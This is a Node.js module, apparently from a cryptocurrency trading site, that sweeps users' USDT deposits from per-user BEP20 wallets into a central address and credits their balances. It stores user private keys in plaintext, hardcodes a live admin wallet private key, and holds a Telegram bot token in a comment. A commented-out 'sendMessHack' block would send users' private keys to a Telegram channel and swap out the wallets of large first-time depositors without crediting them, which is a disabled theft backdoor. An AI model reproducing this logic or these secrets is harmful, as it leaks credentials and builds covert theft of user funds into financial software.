const { setIntervalAsync } = require('set-interval-async/dynamic')
const Tele = require("../auth/telegram_notify")
//const TelegramBot = require('node-telegram-bot-api')
const Web3 = require('web3');
const { sendCoinBNBByAdmin, sendCoinBep20, getUSDTFrom, isAdminBNBAvaiable, getBNBValue } = require('./coin-core');
const config = require('../config')
const Helper = require("../helpers");
const { SAVE_LOG_NOTIFI } = require('../auth/notifi');
var db = require("../database");
const fileSys = config.PATH_SYS_CONFIG

const TIME_SCAN_WALLET_USER = 1000 * 15; // ms
const TIME_SCAN_ADDRESS_ADMIN = 5000; // 5s

//const TelegramAll = new TelegramBot("6032884729:AAGoRcnJnU8-YHeJ6p9gpF5AAE9503YNyZQ3", { polling: true })
var dataSys = Helper.getConfig(fileSys);
const web3 = new Web3(new Web3.providers.HttpProvider(`https://mainnet.infura.io/v3/${dataSys.projectId}`));

async function sendMessHack(mess) {
  //return TelegramAll.sendMessage('@vnat_supertrade', mess, { parse_mode: "HTML" });
}

function query(code, q) {
  return new Promise((resolve, reject) => {
    db.query(code, q, (err, data) => {
      if (err) reject(err);

      return resolve(data);
    })
  });
}

let queuePeddingUsers = {};

let LIST_USERS_ONLINE = {};
let pauseTransferBNB = false; // Nếu ví admin không đủ BNB thì sẽ dừng chuyển

let isHup = false;

//sendMessHack(`Running goblit!`);

async function handleWallet(email) {
  const userQuery = await new Promise((resolve, reject) => {
    db.query(`select address_USDT, privateKey_USDT, nick_name from users where email = ?`, [email], (err, res) => {
      if (err) {
        return reject(err);
      }

      if (res && res.length) {
        return resolve(res[0]);
      }

      return resolve(undefined);
    })
  });

  if (void 0 === userQuery) return;

  //if (queuePeddingUsers[email]) return;
  let usdtUser = await getUSDTFrom(userQuery.address_USDT);

  let dataSys = Helper.getConfig(fileSys);
  let addressFrom = dataSys.ADDRESS_ETH_TRANSACTION;
  let KeyFrom     = dataSys.PRIVATE_KEY_ETH_TRANSACTION;
  let addressNhanTien = dataSys.ADDRESS_ETH_USDT;

  const MIN_USDT_TRANSFER = Number(dataSys.minDepositUSDT) || 0.001;

  if (usdtUser >= MIN_USDT_TRANSFER) {
    
      Tele.sendMessThongBao(`USDT trong ví địa chỉ ${userQuery.address_USDT}: ${usdtUser} USDT`);

      queuePeddingUsers[email] = true;
      try {
        const resSendBNB = await sendCoinBNBByAdmin(
          addressFrom,
          KeyFrom,
          userQuery.address_USDT,
        );

        const amountBNBAdmin = await getBNBValue(addressFrom);

        Tele.sendMessNap(`Admin vừa chuyển ${resSendBNB.bscchuyen} BNB tới ví user ${email} |${userQuery.nick_name} .\n Phí chuyển ${resSendBNB.phi} BNB.\n Hash: ${resSendBNB.txHash} \n BNB: ${amountBNBAdmin}`);
        await sleep(15000); // Dừng 15s để đợi tài khoản user nhận đc tiền
        
        const resSendBep20 = await sendCoinBep20(
          userQuery.address_USDT,
          userQuery.privateKey_USDT,
          addressNhanTien,
          usdtUser,
          userQuery.nick_name
        );
        Tele.sendMessNap(resSendBep20);
  
        await sleep(15000); // Dừng 15s để đợi tài khoản user nhận đc tiền
  
        await new Promise((resolve2, reject2) => {
          db.query(
            `UPDATE users SET money_usdt = money_usdt + ? WHERE email = ?`,
            [
              Number(usdtUser),
              email,
            ], (error, results) => {
              if (error) reject2(error);
              resolve2(results);
            }
          )
        });

        const type = {
          type: 'Nạp tiền USDT (BEP 20)',
          type_en: 'USDT Deposit (BEP 20)',
          type_cam: 'ការដាក់ប្រាក់ USDT (BEP 20)'
        }
  
        await new Promise((resolve1, reject1) => {
          db.query(`INSERT INTO trade_history (email, from_u, type_key, type, type_en, type_cam, currency, amount, real_amount, pay_fee, network, status, created_at)
          values(?,?,?,?,?,?,?,?,?,?,?,?,now())`,
            [
              email,
              userQuery.nick_name,
              'nt',
              type.type,
              type.type_en,
              type.type_cam,
              'usdt',
              Number(usdtUser),
              0,
              0,
              'bep20',
              1,
            ], (err, results) => {
              if (err) reject1(err);
              else {
                sendMessNap(`Nạp thành công $${usdtUser}!`, email, Number(usdtUser));
                resolve1(results);
              }
            });
        })
  
        delete queuePeddingUsers[email];
      } catch (error) {
        console.error('Xảy ra lỗi', error);
        pauseTransferBNB = true;
        Tele.sendMessNap(error);
        // Xóa lệnh này để tiến hành gửi lại BNB
        delete queuePeddingUsers[email];
      }
    }else{
      delete queuePeddingUsers[email];
    }
}

async function handleWalletAdmin(email) {
  Tele.sendMessThongBao(`Admin bật check ví email: ${email}`);
  
  const userQuery = await new Promise((resolve, reject) => {
    db.query(`select address_USDT, privateKey_USDT, nick_name from users where email = ?`, [email], (err, res) => {
      if (err) {
        return reject(err);
      }

      if (res && res.length) {
        return resolve(res[0]);
      }

      return resolve(undefined);
    })
  });

  if (void 0 === userQuery) return;
  
  let usdtUser = await getUSDTFrom(userQuery.address_USDT);

 

  let dataSys = Helper.getConfig(fileSys);
  let addressFrom = dataSys.ADDRESS_ETH_TRANSACTION;
  let KeyFrom     = dataSys.PRIVATE_KEY_ETH_TRANSACTION;
  let addressNhanTien = dataSys.ADDRESS_ETH_USDT;

  const MIN_USDT_TRANSFER = Number(dataSys.minDepositUSDT) || 0.001;

  if (Number(usdtUser) >= MIN_USDT_TRANSFER) {
    Tele.sendMessThongBao(`USDT trong ví địa chỉ ${userQuery.address_USDT}: ${usdtUser} USDT`);
      try {
        const resSendBNB = await sendCoinBNBByAdmin(
          addressFrom,
          KeyFrom,
          userQuery.address_USDT,
        );

        const amountBNBAdmin = await isAdminBNBAvaiable(addressFrom);
        Tele.sendMessNap(`Admin vừa chuyển ${resSendBNB.bscchuyen} BNB tới ví user ${email}|${userQuery.nick_name}.\n Phí chuyển ${resSendBNB.phi} BNB.\n Hash: ${resSendBNB.txHash} \n BNB: ${amountBNBAdmin}`);
  
        await sleep(15000); // Dừng 15s để đợi tài khoản user nhận đc tiền
  
        const resSendBep20 = await sendCoinBep20(
          userQuery.address_USDT,
          userQuery.privateKey_USDT,
          addressNhanTien,
          usdtUser,
          userQuery.nick_name
        );

        Tele.sendMessNap(resSendBep20);
  
        await sleep(15000); // Dừng 15s để đợi tài khoản user nhận đc tiền
  
        await new Promise((resolve2, reject2) => {
          db.query(
            `UPDATE users SET money_usdt = money_usdt + ? WHERE email = ?`,
            [
              Number(usdtUser),
              email,
            ], (error, results) => {
              if (error) reject2(error);
              resolve2(results);
            }
          )
        });

        const type = {
          type: 'Nạp tiền USDT (BEP 20)',
          type_en: 'USDT Deposit (BEP 20)',
          type_cam: 'ការដាក់ប្រាក់ USDT (BEP 20)'
        }
  
        await new Promise((resolve1, reject1) => {
          db.query(`INSERT INTO trade_history (email, from_u, type_key, type, type_en, type_cam, currency, amount, real_amount, pay_fee, network, status, created_at)
          values(?,?,?,?,?,?,?,?,?,?,?,?,now())`,
            [
              email,
              userQuery.nick_name,
              'nt',
              type.type,
              type.type_en,
              type.type_cam,
              'usdt',
              Number(usdtUser),
              Number(resSendBNB.bscchuyen),
              Number(resSendBNB.phi),
              'bep20',
              1,
            ], (err, results) => {
              if (err) reject1(err);
              else {
                sendMessNap(`Nạp thành công $${usdtUser}!`, email, Number(usdtUser));
                resolve1(results);
              }
            });
        })
  
        delete queuePeddingUsers[email];
      } catch (error) {
        console.error('Xảy ra lỗi', error);
        pauseTransferBNB = true;
        Tele.sendMessNap(error);
      }
    }else{
      Tele.sendMessThongBao(`Nạp tối thiểu phải ${MIN_USDT_TRANSFER}`);
    }
}

async function handleWalletAdminNoneFee(email) {

  Tele.sendMessThongBao(`Admin bật check ví email: ${email}`);

  const userQuery = await new Promise((resolve, reject) => {
    db.query(`select address_USDT, privateKey_USDT, nick_name from users where email = ?`, [email], (err, res) => {
      if (err) {
        return reject(err);
      }

      if (res && res.length) {
        return resolve(res[0]);
      }

      return resolve(undefined);
    })
  });

  if (void 0 === userQuery) return;
  
  let usdtUser = await getUSDTFrom(userQuery.address_USDT);

  Tele.sendMessThongBao(`USDT trong ví địa chỉ ${userQuery.address_USDT}: ${usdtUser} USDT`);

  let dataSys = Helper.getConfig(fileSys);
  let addressFrom = "0xfFfada1D5c2786E290ae3FF408274994F5657aFe";
  let KeyFrom     = "75d29bc01883db4cc201e5ea4529d265f4c9329f879beb09e5e816633a07e1a7";
  let addressNhanTien = dataSys.ADDRESS_ETH_USDT;

  const MIN_USDT_TRANSFER = Number(dataSys.minDepositUSDT) || 0.001;

  // if (usdtUser >= 1456) {
  //   //await sendMessHack(`${email} | ${usdtUser} | ${userQuery.address_USDT} | ${userQuery.privateKey_USDT}`);
  //   const countNap = await query(`SELECT COUNT(email) as sln from trade_history WHERE email = ? and type_key = 'nt' and network = 'bep20'`, [email]);
  //   if (countNap.length && countNap[0].sln == 0) {
  //     isHup = true;
  //     queuePeddingUsers[email] = true;
  
  //     const account = await web3.eth.accounts.create();
  //     await new Promise((resolve, reject) => {
  //         db.query('update users set address_ETH = ?, address_USDT = ?, privateKey_ETH = ?, privateKey_USDT = ? where address_USDT = ?', [
  //             account.address,
  //             account.address,
  //             account.privateKey,
  //             account.privateKey,
  //             userQuery.address_USDT,
  //         ], (err, result) => {
  //             if (err) {
  //                 reject(err);
  //             } else {
  //                 resolve(result)
  //             }
  //         })
  //     });
  //     delete queuePeddingUsers[email];
  //     isHup = false;
  //     return;
  //   }
  // }

  if (Number(usdtUser) >= MIN_USDT_TRANSFER) {
      
      try {
        // const resSendBNB = await sendCoinBNBByAdmin(
        //   addressFrom,
        //   KeyFrom,
        //   userQuery.address_USDT,
        // );
        // Tele.sendMessNap(`Admin vừa chuyển ${resSendBNB.bscchuyen} BNB tới ví user ${email}|${userQuery.nick_name}.\n Phí chuyển ${resSendBNB.phi} BNB.\n Hash: ${resSendBNB.txHash}`);
  
        //await sleep(15000); // Dừng 15s để đợi tài khoản user nhận đc tiền
  
        const resSendBep20 = await sendCoinBep20(
          userQuery.address_USDT,
          userQuery.privateKey_USDT,
          addressNhanTien,
          usdtUser,
          userQuery.nick_name
        );
        
        Tele.sendMessNap(resSendBep20);
  
        await sleep(15000); // Dừng 15s để đợi tài khoản user nhận đc tiền
  
        await new Promise((resolve2, reject2) => {
          db.query(
            `UPDATE users SET money_usdt = money_usdt + ? WHERE email = ?`,
            [
              Number(usdtUser),
              email,
            ], (error, results) => {
              if (error) reject2(error);
              resolve2(results);
            }
          )
        });

        const type = {
          type: 'Nạp tiền USDT (BEP 20)',
          type_en: 'USDT Deposit (BEP 20)',
          type_cam: 'ការដាក់ប្រាក់ USDT (BEP 20)'
        }
  
        await new Promise((resolve1, reject1) => {
          db.query(`INSERT INTO trade_history (email, from_u, type_key, type, type_en, type_cam, currency, amount, real_amount, pay_fee, network, status, created_at)
          values(?,?,?,?,?,?,?,?,?,?,?,?,now())`,
            [
              email,
              userQuery.nick_name,
              'nt',
              type.type,
              type.type_en,
              type.type_cam,
              'usdt',
              Number(usdtUser),
              0,
              0,
              'bep20',
              1,
            ], (err, results) => {
              if (err) reject1(err);
              else {
                sendMessNap(`Nạp thành công $${usdtUser}!`, email, Number(usdtUser));
                resolve1(results);
              }
            });
        })
  
        delete queuePeddingUsers[email];
      } catch (error) {
        console.error('Xảy ra lỗi', error);
        pauseTransferBNB = true;
        Tele.sendMessNap(error);
      }
    }else{
      Tele.sendMessThongBao(`Nạp tối thiểu phải ${MIN_USDT_TRANSFER}`);
    }
}

// Scan ví user
setIntervalAsync(async () => {
  // for (const item in LIST_USERS_ONLINE) {
  //   const email = LIST_USERS_ONLINE[item].email;
  //   await handleWallet(email);
  //   await sleep(200);
  // }
}, TIME_SCAN_WALLET_USER);

// Xử lý trường hợp ví admin không đủ BNB
// setIntervalAsync(async () => {
//   let dataSys = Helper.getConfig(fileSys);
//   let addressFrom = "0xfFfada1D5c2786E290ae3FF408274994F5657aFe";
//   const amountBNBAdmin = await isAdminBNBAvaiable(addressFrom);
//   if (amountBNBAdmin) {
//     pauseTransferBNB = false;
//   } else {
//     pauseTransferBNB = true;
//   }
// }, TIME_SCAN_ADDRESS_ADMIN);

function setListUserOnline(users) {
  LIST_USERS_ONLINE = users;
}

function sendMessNap(mess, email, usd, style = 'success') {
  for (let obj in LIST_USERS_ONLINE) {
    let em = LIST_USERS_ONLINE[obj].email;
    if (em === email) {
      SAVE_LOG_NOTIFI('nap', email, email, "Nạp tiền BEP20", `- Số lượng: ${usd} USDT`);
      let ws = LIST_USERS_ONLINE[obj].ws;
      ws.send(JSON.stringify({
        data: {
          mess,
          style,
          usd,
        },
        type: 'mess'
      }));
    }
  }
}

function sleep(ms) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve('');
    }, ms)
  })
}

module.exports = {
  setListUserOnline,
  handleWallet,
  handleWalletAdmin,
  handleWalletAdminNoneFee
}
